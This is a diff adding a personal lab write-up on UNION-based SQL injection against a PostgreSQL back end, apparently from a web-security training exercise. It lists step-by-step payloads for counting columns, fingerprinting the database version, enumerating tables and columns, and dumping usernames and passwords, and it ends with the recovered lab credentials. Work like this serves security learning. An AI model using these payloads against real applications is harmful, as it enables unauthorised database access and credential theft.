@@ -1,0 +1,53 @@
+SQL injection attack, listing the database contents on non-Oracle databases
+
+Analysis----
+find the number of columns->
+' order by 1--
+' order by 2--
+' order by 3--
+
+find columns with text
+check for columns with text:
+' UNION SELECT 'a',NULL-- -> has text
+' UNION SELECT NULL, 'a'-- -> has text
+' UNION SELECT 'a', 'a'-- 
+
+find db version
+not oracle since we would have needed from statement to perform above querries
+
+Microsoft	SELECT @@version
+' UNION SELECT @@version,NULL--
+error
+
+PostgreSQL	SELECT version()
+' UNION SELECT version(),NULL--
+PostgreSQL 12.13 (Ubuntu 12.13-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+MySQL	SELECT @@version
+' UNION SELECT @@version,NULL--
+
+get list of tables in the db ->
+for postgresql the querry below is used
+PostgreSQL	SELECT * FROM information_schema.tables
+
+' UNION SELECT NULL, * FROM information_schema.tables--
+ERROR
+
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+found table -> users_frjkdl - which is may be usernames and pass table
+
+find columns in users table
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_frjkdl'--
+
+found the following columns with the status 200
+username_yxjwxb
+password_euklyr
+
+display usernames and passwords
+' UNION SELECT username_yxjwxb, password_euklyr from users_frjkdl--
+
+results
+wiener
+kgplnefjxj2bd0z6wot0
+administrator
+qhaew956qb3fz672ftas
